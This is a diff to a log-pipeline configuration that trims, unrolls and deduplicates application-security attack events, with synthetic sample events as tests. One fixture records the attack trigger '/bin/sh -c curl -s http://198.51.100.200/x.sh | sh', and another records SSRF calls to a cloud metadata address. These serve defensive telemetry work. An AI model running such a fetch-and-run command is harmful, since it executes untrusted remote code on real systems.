@@ -289,21 +289,107 @@ optimizations:
     fn: Eval
     how: Stack traces are the bulk of every document. Keep the top 5 frames (where the sensitive call and vulnerable method are) for the SIEM and send the full document to Lake.
     expr: "after Unroll: stackTrace = stackTrace.split('\\n').slice(0,5).join('\\n')"
+    stream:
+      log: Malicious IP / command execution
+      parse: false
+      functions:
+        - id: eval
+          filter: /"stackTrace":"/.test(_raw)
+          description: Keep only the top 5 stack frames of each attack event for the SIEM; send the full document to Lake
+          conf:
+            add:
+              - name: _raw
+                value: _raw.replace(/("stackTrace":"(?:[^"\\]|\\[^n])*(?:\\n(?:[^"\\]|\\[^n])*){0,4})(?:\\n(?:[^"\\]|\\[^n])*)*"/g, '$1"')
+      test:
+        - '{"SourceType":"secure_app_attacks","attackId":"31820734","attackSource":"EXTERNAL","attackOutcome":"EXPLOITED","attackTypes":"{RCE,MALIP}","attackEventTrigger":"/bin/sh -c curl -s http://198.51.100.200/x.sh | sh","application":"shop-prod","tier":"catalog-service","businessTransaction":"/admin/upload","attackStatus":"OPEN","attackLastDetected":"2026-11-12 11:15:32 +0000 UTC","attackEvents":[{"attackOutcome":"EXPLOITED","eventType":"PROCESS","attackTypes":"RCE","timestamp":"2026-11-12T11:15:30Z","tierName":"catalog-service","clientAddress":"203.0.113.140","detailJson":{"classname":"java.io.FilePermission","ptype":"PROCESS","methodName":"java.lang.ProcessBuilder.start"},"blocked":false,"vulnerableMethod":"org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parse(JakartaMultiPartRequest.java:67)","matchedCveName":"CVE-2017-5638","maliciousIpOut":"198.51.100.200","maliciousIpSourceOut":"Talos","keyInfo":"","stackTrace":"java.lang.ProcessBuilder.start(ProcessBuilder.java:1029)\njava.lang.Runtime.exec(Runtime.java:620)\norg.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest.parse(JakartaMultiPartRequest.java:67)\norg.apache.struts2.dispatcher.Dispatcher.wrapRequest(Dispatcher.java:907)\norg.apache.struts2.dispatcher.PrepareOperations.wrapRequest(PrepareOperations.java:134)\norg.apache.struts2.dispatcher.filter.StrutsPrepareFilter.doFilter(StrutsPrepareFilter.java:89)\norg.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:193)\norg.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:166)"}]}'
+      expect:
+        out: 2
+        smaller: true
   - title: Unroll attackEvents
     saving: Search cost, not bytes
     fn: Unroll → Flatten
     how: One attack document can carry many events. Unroll attackEvents into one event per runtime event so each has its own _time, eventType and socket/command, then flatten detailJson.
     expr: unroll attackEvents → flatten prefix attackEvent_
+    stream:
+      log: Attack alert (SSRF / RCE)
+      functions:
+        - id: unroll
+          filter: Array.isArray(attackEvents)
+          description: One event per runtime attack event
+          conf:
+            srcExpr: attackEvents
+            dstField: attackEvent
+        - id: eval
+          filter: 'true'
+          description: Remove the original array after unrolling
+          conf:
+            remove:
+              - attackEvents
+        - id: flatten
+          filter: 'true'
+          description: Flatten the attack event and its detailJson
+          conf:
+            fields:
+              - attackEvent
+            prefix: ''
+            depth: 5
+            delimiter: _
+      test:
+        - '{"SourceType":"secure_app_attacks","attackId":"31820458","attackSource":"EXTERNAL","attackOutcome":"EXPLOITED","attackTypes":"{SSRF}","attackEventTrigger":"","application":"shop-prod","tier":"order-service","businessTransaction":"/api/checkout","attackStatus":"OPEN","attackLastDetected":"2026-11-12 09:41:07 +0000 UTC","attackEvents":[{"attackOutcome":"EXPLOITED","eventType":"SOCKET_RESOLVE","attackTypes":"SSRF","timestamp":"2026-11-12T09:41:07Z","clientAddress":"203.0.113.77","detailJson":{"ptype":"SOCKET","socketOut":"169.254.169.254"},"stackTrace":"a"},{"attackOutcome":"EXPLOITED","eventType":"SOCKET_CONNECT","attackTypes":"SSRF","timestamp":"2026-11-12T09:41:08Z","clientAddress":"203.0.113.77","detailJson":{"ptype":"SOCKET","socketOut":"169.254.169.254:80"},"stackTrace":"b"}]}'
+      expect:
+        out: 3
+        absent:
+          - attackEvents
+        present:
+          - attackEvent_eventType
   - title: Drop empty enrichment fields
     saving: 10–20 %
     fn: Parser → Serialize
     how: maliciousIpOut, maliciousIpSourceOut, keyInfo, cveId and attackEventTrigger are empty on most events; remove empty strings and the internal cveId UUID.
     expr: "remove: cveId, keyInfo, attackEventTrigger; drop empty"
+    stream:
+      log: Attack alert (SSRF / RCE)
+      functions:
+        - id: eval
+          filter: 'true'
+          description: Remove empty enrichment fields and the internal cveId from the event and its raw text
+          conf:
+            add:
+              - name: attackEventTrigger
+                value: 'attackEventTrigger === '''' ? undefined : attackEventTrigger'
+              - name: _raw
+                value: _raw.replace(/,"cveId":"[^"]*"/g, '').replace(/,"(maliciousIpOut|maliciousIpSourceOut|keyInfo|attackEventTrigger)":""/g, '')
+      expect:
+        out: 1
+        absent:
+          - attackEventTrigger
+        present:
+          - attackEvents
+        smaller: true
   - title: Suppress repeat updates of the same open attack
     saving: 20–50 %
     fn: Suppress
     how: An OPEN attack is re-sent as new events attach. Keep one per attackId per 15 minutes unless the outcome changes.
     expr: "key: `${attackId}:${attackOutcome}`  allow 1 / 900s"
+    stream:
+      log: Log4Shell / JNDI attack
+      functions:
+        - id: suppress
+          filter: attackStatus == 'OPEN'
+          description: Keep one update per open attack and outcome per 15 minutes
+          conf:
+            keyExpr: attackId + ':' + attackOutcome
+            allow: 1
+            suppressPeriodSec: 900
+            dropEventsMode: true
+            maxCacheSize: 50000
+            cacheIdleTimeoutPeriods: 2
+            numEventsIdleTimeoutTrigger: 10000
+      test:
+        - '{"SourceType":"secure_app_attacks","attackId":"31820611","attackSource":"EXTERNAL","attackOutcome":"BLOCKED","attackTypes":"{LOG4J}","application":"hr-portal","tier":"hr-web","businessTransaction":"/login","attackStatus":"OPEN","attackLastDetected":"2026-11-12 10:07:55 +0000 UTC","attackEvents":[]}'
+        - '{"SourceType":"secure_app_attacks","attackId":"31820611","attackSource":"EXTERNAL","attackOutcome":"EXPLOITED","attackTypes":"{LOG4J}","application":"hr-portal","tier":"hr-web","businessTransaction":"/login","attackStatus":"OPEN","attackLastDetected":"2026-11-12 10:09:55 +0000 UTC","attackEvents":[]}'
+      expect:
+        out: 2
 references:
   - title: Integrate Secure Application with Splunk (AppDynamics SaaS docs)
     url: https://help.splunk.com/en/appdynamics-saas/application-security-monitoring/26.7.0/application-security-monitoring/integrate-secure-application-with-splunk
